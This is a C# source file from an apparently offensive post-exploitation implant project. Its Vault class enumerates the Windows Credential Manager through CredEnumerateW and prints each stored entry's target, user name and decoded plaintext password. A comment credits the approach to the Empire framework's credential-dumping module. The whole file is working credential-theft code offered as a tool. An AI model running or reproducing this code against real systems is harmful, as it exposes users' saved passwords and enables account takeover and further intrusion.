using System;
using System.Runtime.InteropServices;

namespace WheresMyImplant
{
    class Vault
    {
        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public Vault()
        {
        }

        ////////////////////////////////////////////////////////////////////////////////
        // 
        ////////////////////////////////////////////////////////////////////////////////
        internal void EnumerateCredentials()
        {
            Int32 count = 0;
            IntPtr hCredential;
            if (!Advapi32.CredEnumerateW(null, 0, out count, out hCredential))
            {
                Console.WriteLine("Unable to read");
                Console.WriteLine(Marshal.GetLastWin32Error());
                Console.WriteLine(count);
                return;
            }

            Structs._CREDENTIAL[] credentialObject = new Structs._CREDENTIAL[count];
            for (Int32 i = 0; i < count; i++)
            {
                IntPtr hTemp = Marshal.ReadIntPtr(hCredential, i * IntPtr.Size);
                try
                {
                    
                    Structs._CREDENTIAL credential = (Structs._CREDENTIAL)Marshal.PtrToStructure(hTemp, typeof(Structs._CREDENTIAL));
                    Console.WriteLine("{0,-20} {1,-20}", "Flags", credential.Flags);
                    Console.WriteLine("{0,-20} {1,-20}", "Type", credential.Type);
                    Console.WriteLine("{0,-20} {1,-20}", "TargetName", PrintIntPtr(credential.TargetName));
                    Console.WriteLine("{0,-20} {1,-20}", "Comment", PrintIntPtr(credential.Comment));

                    //https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1
                    Int64 lastWritten = credential.LastWritten.dwHighDateTime;
                    lastWritten = (lastWritten << 32) + credential.LastWritten.dwLowDateTime;
                    Console.WriteLine("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(lastWritten));

                    Console.WriteLine("{0,-20} {1,-20}", "Password Size", credential.CredentialBlobSize);
                    String credentialBlob;
                    if (0 < credential.CredentialBlobSize)
                    {
                        credentialBlob = Marshal.PtrToStringUni(credential.CredentialBlob, (Int32)credential.CredentialBlobSize / 2);
                    }
                    else
                    {
                        credentialBlob = PrintIntPtr(credential.CredentialBlob);
                    }

                    Console.WriteLine("{0,-20} {1,-20}", "Password", credentialBlob);
                    Console.WriteLine("{0,-20} {1,-20}", "Persist", credential.Persist);
                    Console.WriteLine("{0,-20} {1,-20}", "AttributeCount", credential.AttributeCount);
                    Console.WriteLine("{0,-20} {1,-20}", "Attributes", credential.Attributes);
                    Console.WriteLine("{0,-20} {1,-20}", "TargetAlias", PrintIntPtr(credential.TargetAlias));
                    Console.WriteLine("{0,-20} {1,-20}", "UserName", PrintIntPtr(credential.UserName));
                    Console.WriteLine("");
                }
                catch (Exception error)
                {
                }
                finally
                {
                    Unmanaged.CloseHandle(hTemp);
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private static String PrintIntPtr(IntPtr input)
        {
            String output = "";
            if (IntPtr.Zero != input)
            {
                try
                {
                    output = Marshal.PtrToStringUni(input);
                }
                catch (AccessViolationException)
                {
                    output = "error";
                }
            }
            return output;
        }

    }
}